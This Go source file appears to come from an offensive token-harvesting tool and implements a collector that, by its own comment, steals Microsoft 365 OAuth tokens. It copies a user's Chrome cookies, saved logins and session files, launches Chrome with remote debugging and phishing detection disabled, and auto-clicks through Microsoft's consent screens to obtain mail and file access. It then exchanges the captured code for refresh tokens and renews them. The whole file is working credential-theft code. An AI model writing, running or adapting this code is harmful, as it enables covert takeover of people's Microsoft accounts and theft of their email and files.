package microsoft

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/ninken/ninloader-go/internal/cdp"
	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
	"github.com/ninken/ninloader-go/internal/validator"
)

// FOCI client -- Microsoft Office, works for all M365 services without
// client_secret (public client). A refresh token from this client can be
// exchanged for tokens to Teams, Outlook, OneDrive, Azure CLI, etc.
const hijackFOCIClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"

// Default scopes: offline_access for refresh token, plus useful Graph API permissions.
var hijackScopes = []string{
	"offline_access",
	"openid",
	"profile",
	"User.Read",
	"Mail.Read",
	"Files.Read.All",
}

const (
	hijackTokenEndpoint     = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
	hijackAuthorizeEndpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
)

// Domains that must bypass the dead proxy during the OAuth consent flow.
// Missing any of these causes chrome-error://chromewebdata/ navigation failures.
// Keep sorted by category for easy auditing.
var msAuthBypassDomains = []string{
	// --- Primary login endpoints ---
	"login.microsoftonline.com",
	"login.microsoft.com",
	"login.live.com",
	"login.windows.net",
	"sts.windows.net",
	"device.login.microsoftonline.com",
	"stamp2.login.microsoftonline.com",
	"autologon.microsoftazuread-sso.com",
	"content.microsoftonline.com",
	// --- Auth CDN / static assets ---
	"aadcdn.msftauth.net",
	"aadcdn.msauth.net",
	"logincdn.msftauth.net",
	"lgincdn.msauth.net",
	"msftauth.net",
	"msauth.net",
	"aadcdn.msftauthimages.net",
	"aadcdn.msauthimages.net",
	"ajax.aspnetcdn.com",
	// --- Wildcard patterns ---
	"*.microsoft.com",
	"*.live.com",
	"*.microsoftonline.com",
	"*.microsoftonline-p.com",
	"*.msftauth.net",
	"*.msauth.net",
	"*.msftauthimages.net",
	"*.msauthimages.net",
	// --- Localhost (redirect capture) ---
	"localhost",
	"127.0.0.1",
}

// Files to copy from Chrome profile -- enough for session cookies + login state.
var profileFiles = []string{
	"Local State",
	// Cookies (including WAL and journal)
	filepath.Join("Default", "Cookies"),
	filepath.Join("Default", "Cookies-journal"),
	filepath.Join("Default", "Cookies-wal"),
	filepath.Join("Default", "Network", "Cookies"),
	filepath.Join("Default", "Network", "Cookies-journal"),
	filepath.Join("Default", "Network", "Cookies-wal"),
	// Login state (saved credentials, session tokens)
	filepath.Join("Default", "Login Data"),
	filepath.Join("Default", "Login Data-journal"),
	filepath.Join("Default", "Login Data-wal"),
	filepath.Join("Default", "Login Data For Account"),
	filepath.Join("Default", "Login Data For Account-journal"),
	filepath.Join("Default", "Web Data"),
	filepath.Join("Default", "Web Data-journal"),
	// Chrome config
	filepath.Join("Default", "Preferences"),
	filepath.Join("Default", "Secure Preferences"),
	// Extension cookies (some auth flows use these)
	filepath.Join("Default", "Extension Cookies"),
	filepath.Join("Default", "Extension Cookies-journal"),
}

// Directories to copy (shallow -- session state).
var profileDirs = []string{
	filepath.Join("Default", "Session Storage"),
	filepath.Join("Default", "Sessions"),
}

func init() {
	registry.Register("microsoft", "browser_hijack", func() collector.Collector {
		return &BrowserHijackCollector{
			BaseCollector: collector.BaseCollector{Svc: "microsoft", Src: "browser_hijack"},
		}
	})
}

// BrowserHijackCollector steals Microsoft 365 OAuth tokens via Chrome profile
// hijack. Uses the FOCI client_id (Microsoft Office) so the refresh token can
// be exchanged for tokens to Teams, Outlook, OneDrive, Azure CLI, etc.
type BrowserHijackCollector struct {
	collector.BaseCollector
}

func (c *BrowserHijackCollector) Service() string          { return c.Svc }
func (c *BrowserHijackCollector) Source() string            { return c.Src }
func (c *BrowserHijackCollector) StealthScore() int         { return 4 }
func (c *BrowserHijackCollector) Platforms() []string       { return nil }
func (c *BrowserHijackCollector) IsPlatformSupported() bool { return true }

// Discover checks for Chrome binary and cookies.
func (c *BrowserHijackCollector) Discover() []*types.DiscoveredToken {
	chrome := findChrome()
	chromeDir := platform.ChromeUserDataDir()

	hasCookies := fileExists(filepath.Join(chromeDir, "Default", "Cookies")) ||
		fileExists(filepath.Join(chromeDir, "Default", "Network", "Cookies"))

	if chrome != "" && hasCookies {
		details := fmt.Sprintf(
			"Chrome + FOCI client (Microsoft Office) -- headless OAuth hijack (client_id=%s...)",
			hijackFOCIClientID[:20],
		)
		return []*types.DiscoveredToken{
			{
				Service:      c.Svc,
				Source:       c.Src,
				Path:         chromeDir,
				AccountHint:  "active Chrome Microsoft session",
				StealthScore: c.StealthScore(),
				Details:      details,
			},
		}
	}

	var missing []string
	if chrome == "" {
		missing = append(missing, "Chrome binary")
	}
	if !hasCookies {
		missing = append(missing, "Chrome cookies")
	}
	if len(missing) > 0 {
		return []*types.DiscoveredToken{
			{
				Service:      c.Svc,
				Source:       c.Src,
				StealthScore: c.StealthScore(),
				Details:      fmt.Sprintf("missing: %s", strings.Join(missing, ", ")),
			},
		}
	}

	return nil
}

// Collect performs the full browser hijack flow.
func (c *BrowserHijackCollector) Collect() []*types.CollectedToken {
	// Preflight checks.
	chrome := findChrome()
	if chrome == "" {
		c.Warn("Chrome binary not found")
		return nil
	}

	// 1. Copy Chrome profile.
	c.Info("Copying Chrome profile...")
	tempDir, err := c.copyProfile()
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to copy Chrome profile: %v", err))
		return nil
	}
	defer os.RemoveAll(tempDir)

	// 2. Start localhost capture server.
	capturePort, listener, err := findFreePort()
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to bind capture port: %v", err))
		return nil
	}

	redirectURI := fmt.Sprintf("http://localhost:%d", capturePort)
	capture := &authCodeCapture{}

	mux := http.NewServeMux()
	mux.HandleFunc("/", capture.handler)
	server := &http.Server{
		Handler:      mux,
		ReadTimeout:  25 * time.Second,
		WriteTimeout: 25 * time.Second,
	}

	var serverWg sync.WaitGroup
	serverWg.Add(1)
	go func() {
		defer serverWg.Done()
		_ = server.Serve(listener)
	}()

	// 3. Build OAuth URL.
	scope := strings.Join(hijackScopes, " ")
	oauthParams := url.Values{
		"client_id":     {hijackFOCIClientID},
		"redirect_uri":  {redirectURI},
		"response_type": {"code"},
		"scope":         {scope},
		"prompt":        {"consent"},
	}
	oauthURL := fmt.Sprintf("%s?%s", hijackAuthorizeEndpoint, oauthParams.Encode())

	// 4. Launch Chrome with copied profile + remote debugging.
	debugPort, debugListener, err := findFreePort()
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to bind debug port: %v", err))
		server.Close()
		return nil
	}
	debugListener.Close() // Free the port for Chrome.

	c.Info("Launching Chrome with CDP debugging...")
	bypassList := strings.Join(msAuthBypassDomains, ",")
	chromeArgs := []string{
		fmt.Sprintf("--user-data-dir=%s", tempDir),
		fmt.Sprintf("--remote-debugging-port=%d", debugPort),
		"--no-first-run",
		"--no-default-browser-check",
		"--disable-extensions",
		"--disable-background-networking",
		"--disable-sync",
		"--disable-translate",
		"--disable-component-update",
		"--disable-domain-reliability",
		"--disable-client-side-phishing-detection",
		"--disable-features=MediaRouter,AccountConsistency,DiceFixAuthErrors,MirrorAccountConsistency",
		"--proxy-server=socks5://127.0.0.1:1",
		fmt.Sprintf("--proxy-bypass-list=%s", bypassList),
		"--window-size=1280,800",
		oauthURL,
	}

	proc := exec.Command(chrome, chromeArgs...)
	proc.Stdout = nil
	proc.Stderr = nil
	if err := proc.Start(); err != nil {
		c.Warn(fmt.Sprintf("Failed to launch Chrome: %v", err))
		server.Close()
		return nil
	}

	// Ensure Chrome is killed and server closed on all exit paths.
	defer func() {
		_ = proc.Process.Kill()
		_ = proc.Wait()
		server.Close()
	}()

	// 5. Connect CDP and auto-click through Microsoft consent flow.
	c.Info(fmt.Sprintf("Connecting CDP on port %d...", debugPort))
	cdpClient := cdp.NewClient(debugPort, 15*time.Second)

	time.Sleep(1500 * time.Millisecond) // Minimal Chrome startup wait.

	if err := cdpClient.Connect("login.microsoftonline.com"); err != nil {
		c.Warn(fmt.Sprintf("CDP connect failed: %v", err))
		// Still wait for redirect in case the flow completes without CDP.
	} else {
		_, _ = cdpClient.Send("Page.enable", nil)
		c.Info("CDP connected - auto-clicking consent flow...")

		// Auto-click loop: handle account picker -> consent -> accept.
		for attempt := 0; attempt < 12; attempt++ {
			time.Sleep(1500 * time.Millisecond)

			currentURL, err := cdpClient.GetURL()
			if err != nil {
				continue
			}

			// Already redirected to localhost? Done!
			if strings.Contains(currentURL, fmt.Sprintf("localhost:%d", capturePort)) {
				c.Info("  Redirect captured!")
				break
			}

			// Chrome navigation error -- dead proxy blocked a required domain.
			if strings.HasPrefix(currentURL, "chrome-error://") {
				blocked := detectBlockedDomain(cdpClient)
				if blocked != "" {
					c.Warn(fmt.Sprintf(
						"Dead proxy blocked domain: %s -- add it to msAuthBypassDomains",
						blocked,
					))
				} else {
					c.Warn(
						"Chrome hit a navigation error (chrome-error://chromewebdata/). " +
							"A required Microsoft auth domain is likely missing from the proxy bypass list.",
					)
				}
				break
			}

			pageText := cdpGetText(cdpClient)
			pageLower := strings.ToLower(pageText)
			c.Info(fmt.Sprintf("  [%d] URL: ...%s", attempt+1, truncateRight(currentURL, 60)))

			// Step 1: Account picker -- click the target email/account.
			if strings.Contains(pageLower, "pick an account") || strings.Contains(pageLower, "choose an account") {
				clicked := cdpClickAccountPicker(cdpClient)
				if clicked {
					c.Info("  Clicked account in picker")
					continue
				}
			}

			// Step 2: Password page -- we rely on the session cookie.
			hasPasswordInput := cdpHasPasswordInput(cdpClient)
			if hasPasswordInput || strings.Contains(pageLower, "enter password") {
				if strings.Contains(pageLower, "sign in another way") {
					cdpClient.ClickByText("Sign in another way", "button,a,div[role=button],span")
					c.Info("  Clicked 'Sign in another way'")
					continue
				}
				c.Warn(
					"Microsoft requires password -- session cookie insufficient. " +
						"The user may need to re-authenticate in their browser first.",
				)
				break
			}

			// Step 3: "Stay signed in?" / KMSI page.
			if strings.Contains(pageLower, "stay signed in") {
				clicked := cdpClient.ClickByText("Yes", "button,input[type=submit],a") ||
					cdpClient.Click("#idSIButton9") ||
					cdpClient.ClickByText("No", "button,input[type=submit],a") ||
					cdpClient.Click("#idBtn_Back") ||
					cdpClient.Click("input[type=submit]")
				if clicked {
					c.Info("  Clicked 'Yes' on KMSI page")
					continue
				}
			}

			// Step 4: Consent/permissions page -- click "Accept".
			if strings.Contains(pageLower, "permissions requested") || strings.Contains(pageLower, "accept") {
				clicked := cdpClient.Click("#idBtn_Accept") ||
					cdpClient.Click("input[value='Accept']") ||
					cdpClient.ClickByText("Accept", "button,input[type=submit],a") ||
					cdpClient.Click("input[type=submit]")
				if clicked {
					c.Info("  Clicked Accept on consent page")
					continue
				}
			}

			// Step 5: "Yes" button (generic confirmation).
			if containsWord(pageLower, "yes") {
				clicked := cdpClient.Click("#idSIButton9") ||
					cdpClient.ClickByText("Yes", "button,input[type=submit],a")
				if clicked {
					c.Info("  Clicked Yes")
					continue
				}
			}

			// Step 6: "Next" button (multi-step flow).
			if containsWord(pageLower, "next") {
				clicked := cdpClient.Click("#idSIButton9") ||
					cdpClient.ClickByText("Next", "button,input[type=submit],a") ||
					cdpClient.Click("input[type=submit]")
				if clicked {
					c.Info("  Clicked Next")
					continue
				}
			}

			// Fallback: try any submit button.
			cdpClient.Click("input[type=submit],button[type=submit]")
		}

		cdpClient.Close()
	}

	// 6. Wait for redirect to capture server.
	c.Info(fmt.Sprintf("Waiting for OAuth redirect on port %d...", capturePort))
	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		if capture.getCode() != "" || capture.getError() != "" {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	// 7. Check result.
	if capture.getError() != "" {
		c.Warn(fmt.Sprintf("OAuth error: %s", capture.getError()))
		return nil
	}

	authCode := capture.getCode()
	if authCode == "" {
		c.Warn(
			"Timed out waiting for OAuth redirect. " +
				"The user may not have an active Microsoft session in Chrome, " +
				"or the consent flow requires interaction.",
		)
		return nil
	}

	c.Info("Auth code captured! Exchanging for tokens...")

	// 8. Exchange auth code for tokens.
	tokenData, err := exchangeAuthCode(authCode, redirectURI)
	if err != nil {
		c.Warn(fmt.Sprintf("Token exchange failed: %v", err))
		return nil
	}

	// 9. Extract identity from id_token JWT.
	var email, tenantID, displayName, oid string
	idToken, _ := tokenData["id_token"].(string)
	if idToken != "" {
		claims := validator.DecodeJWTPayload(idToken)
		if claims != nil {
			email = firstString(claims, "preferred_username", "email", "upn")
			tenantID, _ = claims["tid"].(string)
			displayName, _ = claims["name"].(string)
			oid, _ = claims["oid"].(string)
		}
	}

	accountID := oid
	if accountID == "" {
		accountID = email
	}

	scopeStr, _ := tokenData["scope"].(string)
	var tokenScopes []string
	if scopeStr != "" {
		tokenScopes = strings.Fields(scopeStr)
	}

	accessToken, _ := tokenData["access_token"].(string)
	if accessToken == "" {
		c.Warn("token response missing access_token")
		return nil
	}

	tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
	tok.AccountID = accountID
	tok.Username = email
	tok.DisplayName = displayName
	tok.TenantID = tenantID
	tok.AccessToken = types.Secure(accessToken)
	if rt, ok := tokenData["refresh_token"].(string); ok {
		tok.RefreshToken = types.Secure(rt)
	}
	tok.ClientID = hijackFOCIClientID
	tok.TokenURI = hijackTokenEndpoint
	tok.Scopes = tokenScopes
	tok.FOCI = true
	tok.Extra["grant_type"] = "browser_hijack"
	tok.Extra["id_token_present"] = idToken != ""
	tok.Extra["foci_family"] = "1"

	c.Info(fmt.Sprintf(
		"SUCCESS - Microsoft FOCI refresh token obtained for %s%s",
		orDefault(email, "unknown user"),
		ternary(tenantID != "", fmt.Sprintf(" (tenant: %s)", tenantID), ""),
	))

	return []*types.CollectedToken{tok}
}

// Refresh exchanges a Microsoft FOCI refresh token for new tokens.
func (c *BrowserHijackCollector) Refresh(token *types.CollectedToken) *types.RefreshResult {
	if token.RefreshToken == nil || token.RefreshToken.IsEmpty() {
		return &types.RefreshResult{
			Success: false,
			Service: c.Svc,
			Source:  c.Src,
			Error:   "No refresh token available",
		}
	}

	clientID := token.ClientID
	if clientID == "" {
		clientID = hijackFOCIClientID
	}
	tenantID := token.TenantID
	if tenantID == "" {
		tenantID = "common"
	}
	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenantID)

	scope := strings.Join(hijackScopes, " ")
	resp, err := fociHTTPClient.PostForm(tokenURL, url.Values{
		"client_id":     {clientID},
		"refresh_token": {token.RefreshToken.Value()},
		"grant_type":    {"refresh_token"},
		"scope":         {scope},
	})
	if err != nil {
		return &types.RefreshResult{
			Success: false,
			Service: c.Svc,
			Source:  c.Src,
			Error:   fmt.Sprintf("Refresh request failed: %v", err),
		}
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)

	var result map[string]any
	if err := json.Unmarshal(raw, &result); err != nil {
		return &types.RefreshResult{
			Success: false,
			Service: c.Svc,
			Source:  c.Src,
			Error:   fmt.Sprintf("JSON decode error: %v", err),
		}
	}

	accessToken, _ := result["access_token"].(string)
	if accessToken == "" {
		errDesc, _ := result["error_description"].(string)
		if errDesc == "" {
			errDesc, _ = result["error"].(string)
		}
		if errDesc == "" {
			errDesc = "Refresh failed"
		}
		return &types.RefreshResult{
			Success: false,
			Service: c.Svc,
			Source:  c.Src,
			Error:   errDesc,
		}
	}

	// Extract identity from new id_token.
	var claims map[string]any
	if idTok, ok := result["id_token"].(string); ok && idTok != "" {
		claims = validator.DecodeJWTPayload(idTok)
	}
	if claims == nil {
		claims = map[string]any{}
	}

	scopeStr, _ := result["scope"].(string)
	var tokenScopes []string
	if scopeStr != "" {
		tokenScopes = strings.Fields(scopeStr)
	}

	newRefresh, _ := result["refresh_token"].(string)
	if newRefresh == "" {
		newRefresh = token.RefreshToken.Value()
	}

	newTok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
	newTok.AccountID = stringClaimFallback(claims, "oid", token.AccountID)
	newTok.Username = stringClaimFallback(claims, "preferred_username", token.Username)
	newTok.DisplayName = stringClaimFallback(claims, "name", token.DisplayName)
	newTok.TenantID = stringClaimFallback(claims, "tid", tenantID)
	newTok.AccessToken = types.Secure(accessToken)
	newTok.RefreshToken = types.Secure(newRefresh)
	newTok.ClientID = clientID
	newTok.TokenURI = tokenURL
	newTok.Scopes = tokenScopes
	newTok.FOCI = true
	newTok.Extra["grant_type"] = "browser_hijack"
	newTok.Extra["foci_family"] = "1"

	return &types.RefreshResult{
		Success:  true,
		Service:  c.Svc,
		Source:   c.Src,
		NewToken: newTok,
	}
}

// -- Profile copy -----------------------------------------------------------

// copyProfile copies minimal Chrome profile files to a temp directory.
func (c *BrowserHijackCollector) copyProfile() (string, error) {
	chromeDir := platform.ChromeUserDataDir()
	if _, err := os.Stat(chromeDir); err != nil {
		return "", fmt.Errorf("Chrome user data dir not found: %s", chromeDir)
	}

	tempDir, err := os.MkdirTemp("", "ninloader_ms_chrome_")
	if err != nil {
		return "", err
	}

	// Copy individual files.
	for _, relPath := range profileFiles {
		src := filepath.Join(chromeDir, relPath)
		dst := filepath.Join(tempDir, relPath)
		if _, err := os.Stat(src); err != nil {
			continue
		}
		if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
			continue
		}
		if err := copyFile(src, dst); err != nil {
			continue
		}
	}

	// Copy directories (session state).
	for _, relDir := range profileDirs {
		src := filepath.Join(chromeDir, relDir)
		dst := filepath.Join(tempDir, relDir)
		info, err := os.Stat(src)
		if err != nil || !info.IsDir() {
			continue
		}
		_ = copyDir(src, dst)
	}

	// Chrome needs a First Run sentinel to skip setup wizard.
	_ = os.WriteFile(filepath.Join(tempDir, "First Run"), []byte{}, 0600)

	// Patch Preferences to avoid "Restore pages" dialog.
	prefsPath := filepath.Join(tempDir, "Default", "Preferences")
	if data, err := os.ReadFile(prefsPath); err == nil {
		var prefs map[string]any
		if json.Unmarshal(data, &prefs) == nil {
			// Ensure profile and session keys exist.
			profile, _ := prefs["profile"].(map[string]any)
			if profile == nil {
				profile = make(map[string]any)
			}
			profile["exit_type"] = "Normal"
			profile["exited_cleanly"] = true
			prefs["profile"] = profile

			session, _ := prefs["session"].(map[string]any)
			if session == nil {
				session = make(map[string]any)
			}
			session["restore_on_startup"] = 4
			prefs["session"] = session

			if patched, err := json.Marshal(prefs); err == nil {
				_ = os.WriteFile(prefsPath, patched, 0600)
			}
		}
	}

	return tempDir, nil
}

// -- Auth code capture server -----------------------------------------------

// authCodeCapture is a thread-safe container for the OAuth auth code or error.
type authCodeCapture struct {
	mu    sync.Mutex
	code  string
	error string
}

func (a *authCodeCapture) getCode() string {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.code
}

func (a *authCodeCapture) getError() string {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.error
}

func (a *authCodeCapture) handler(w http.ResponseWriter, r *http.Request) {
	params := r.URL.Query()

	a.mu.Lock()
	defer a.mu.Unlock()

	if code := params.Get("code"); code != "" {
		a.code = code
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(200)
		fmt.Fprint(w,
			"<html><body><h2>&#10003; Token captured</h2>"+
				"<p>You can close this tab. NinLoader has your token.</p>"+
				"</body></html>",
		)
		return
	}

	if errParam := params.Get("error"); errParam != "" {
		a.error = errParam
		desc := params.Get("error_description")
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(200)
		fmt.Fprintf(w,
			"<html><body><h2>OAuth error: %s</h2><p>%s</p></body></html>",
			errParam, desc,
		)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	w.WriteHeader(200)
	fmt.Fprint(w, "<html><body>Waiting for OAuth redirect...</body></html>")
}

// -- Chrome binary discovery ------------------------------------------------

// findChrome finds the Chrome binary on the current platform.
func findChrome() string {
	var candidates []string

	switch runtime.GOOS {
	case "darwin":
		candidates = []string{
			"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
			"/Applications/Chromium.app/Contents/MacOS/Chromium",
			filepath.Join(homeDir(), "Applications/Google Chrome.app/Contents/MacOS/Google Chrome"),
		}
	case "windows":
		for _, envVar := range []string{"PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"} {
			base := os.Getenv(envVar)
			if base != "" {
				candidates = append(candidates, filepath.Join(base, "Google", "Chrome", "Application", "chrome.exe"))
			}
		}
	default: // Linux
		candidates = []string{
			"/usr/bin/google-chrome",
			"/usr/bin/google-chrome-stable",
			"/usr/bin/chromium-browser",
			"/usr/bin/chromium",
			"/snap/bin/chromium",
		}
	}

	for _, path := range candidates {
		if fileExists(path) {
			return path
		}
	}

	// Fallback: try PATH.
	for _, name := range []string{"google-chrome", "google-chrome-stable", "chromium", "chrome"} {
		if path, err := exec.LookPath(name); err == nil {
			return path
		}
	}

	return ""
}

// -- Token exchange ---------------------------------------------------------

// exchangeAuthCode exchanges an authorization code for access + refresh tokens.
// FOCI clients are public -- no client_secret required.
func exchangeAuthCode(code, redirectURI string) (map[string]any, error) {
	scope := strings.Join(hijackScopes, " ")
	resp, err := fociHTTPClient.PostForm(hijackTokenEndpoint, url.Values{
		"code":          {code},
		"client_id":     {hijackFOCIClientID},
		"redirect_uri":  {redirectURI},
		"grant_type":    {"authorization_code"},
		"scope":         {scope},
	})
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(raw))
	}
	var result map[string]any
	if err := json.Unmarshal(raw, &result); err != nil {
		return nil, fmt.Errorf("JSON decode: %w", err)
	}
	if _, ok := result["access_token"]; !ok {
		errDesc, _ := result["error_description"].(string)
		if errDesc == "" {
			errDesc = "No access_token in response"
		}
		return nil, fmt.Errorf("%s", errDesc)
	}
	return result, nil
}

// -- CDP helpers ------------------------------------------------------------

// detectBlockedDomain uses performance.getEntries() via CDP to find which
// domain the dead proxy blocked.
func detectBlockedDomain(c *cdp.Client) string {
	result, err := c.Evaluate(
		"(function() {" +
			"  var entries = performance.getEntries();" +
			"  var urls = [];" +
			"  for (var i = 0; i < entries.length; i++) {" +
			"    var e = entries[i];" +
			"    if (e.name && e.name.startsWith('http')) {" +
			"      urls.push(e.name);" +
			"    }" +
			"  }" +
			"  return urls;" +
			"})()",
	)
	if err != nil {
		return ""
	}

	urls, ok := result.([]any)
	if !ok || len(urls) == 0 {
		return ""
	}

	lastURL, ok := urls[len(urls)-1].(string)
	if !ok {
		return ""
	}

	parsed, err := url.Parse(lastURL)
	if err != nil {
		return lastURL
	}
	if parsed.Hostname() != "" {
		return parsed.Hostname()
	}
	return lastURL
}

// cdpGetText gets document.body.innerText via CDP.
func cdpGetText(c *cdp.Client) string {
	result, err := c.Evaluate("document.body.innerText")
	if err != nil {
		return ""
	}
	s, _ := result.(string)
	return s
}

// cdpHasPasswordInput checks if the page has a visible password input.
func cdpHasPasswordInput(c *cdp.Client) bool {
	result, err := c.Evaluate(
		"!!document.querySelector('input[type=password]:not([aria-hidden=true])')",
	)
	if err != nil {
		return false
	}
	b, _ := result.(bool)
	return b
}

// cdpClickAccountPicker attempts to click an account in the Microsoft account picker.
func cdpClickAccountPicker(c *cdp.Client) bool {
	// Try clicking by data-email attribute first (most reliable).
	result, err := c.Evaluate(
		"(function() {" +
			"  var el = document.querySelector('[data-email]');" +
			"  if (el) { el.click(); return true; }" +
			"  return false;" +
			"})()",
	)
	if err == nil {
		if b, ok := result.(bool); ok && b {
			return true
		}
	}

	// Try common account tile selectors.
	if c.Click("div[data-test-id='table'] div[role='button']") {
		return true
	}
	if c.Click("div.table div[role='link']") {
		return true
	}
	if c.Click("li.AccountItem") {
		return true
	}
	if c.Click("div.tile[data-bind]") {
		return true
	}
	if c.Click("div[data-test-id] small") {
		return true
	}

	// Fallback: click any element with an email pattern.
	result, err = c.Evaluate(
		"(function() {" +
			"  var els = document.querySelectorAll(" +
			"    'div[role=button],div[role=link],li,small,div.table-row,div.row'" +
			"  );" +
			"  for (var i = 0; i < els.length; i++) {" +
			"    if (els[i].textContent.match(/@/)) {" +
			"      els[i].click(); return true;" +
			"    }" +
			"  }" +
			"  return false;" +
			"})()",
	)
	if err == nil {
		if b, ok := result.(bool); ok && b {
			return true
		}
	}

	return false
}

// -- Utility functions ------------------------------------------------------

// findFreePort binds to a random port on 127.0.0.1 and returns the port
// number and the listener. The caller must either use the listener directly
// or close it to free the port.
func findFreePort() (int, net.Listener, error) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, nil, err
	}
	port := listener.Addr().(*net.TCPAddr).Port
	return port, listener, nil
}

// fileExists returns true if the given path exists and is a regular file.
func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && !info.IsDir()
}

// copyFile copies a single file from src to dst with restrictive 0600 permissions.
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// copyDir recursively copies a directory tree.
func copyDir(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())
		if entry.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				continue
			}
		} else {
			if err := copyFile(srcPath, dstPath); err != nil {
				continue
			}
		}
	}
	return nil
}

// homeDir returns the user's home directory.
func homeDir() string {
	h, _ := os.UserHomeDir()
	return h
}

// truncateRight returns the last n characters of s.
func truncateRight(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[len(s)-n:]
}

// containsWord checks if a word appears as a standalone word in text.
func containsWord(text, word string) bool {
	for _, w := range strings.Fields(text) {
		if w == word {
			return true
		}
	}
	return false
}

// firstString returns the first non-empty string claim from the map.
func firstString(m map[string]any, keys ...string) string {
	for _, k := range keys {
		if v, ok := m[k].(string); ok && v != "" {
			return v
		}
	}
	return ""
}

// orDefault returns s if non-empty, otherwise the default.
func orDefault(s, def string) string {
	if s != "" {
		return s
	}
	return def
}

// ternary returns a if cond is true, otherwise b.
func ternary(cond bool, a, b string) string {
	if cond {
		return a
	}
	return b
}
